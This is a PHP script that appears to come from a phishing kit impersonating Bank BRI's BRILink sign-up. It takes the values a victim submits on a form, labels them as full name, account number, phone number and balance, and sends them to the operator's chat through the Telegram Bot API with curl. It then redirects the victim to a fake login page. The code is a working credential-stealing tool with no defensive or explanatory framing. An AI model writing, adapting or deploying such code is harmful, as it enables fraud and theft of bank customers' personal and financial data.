<?php
include "telegram.php";
session_start();

$provinsi  = $_POST['provinsi'];
$kabupaten = $_POST['kabupaten'];
$kecamatan = $_POST['kecamatan'];
$kelurahan = $_POST['kelurahan'];

$_SESSION['provinsi'] = $provinsi;
$_SESSION['kabupaten'] = $kabupaten;
$_SESSION['kecamatan'] = $kecamatan;
$_SESSION['kelurahan'] = $kelurahan;

$message = "
( Bank BRI | DAFTAR BRILink | )

- Nama Lengkap :
  ".$provinsi."  ".$kabupaten."


- Nomor Rekening :
  ".$kabupaten."

- No HP : ".$kecamatan."

- Saldo : ".$kelurahan."

 ";

function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($id_telegram, $message, $id_botTele);
header('Location: ../login.php');
?>
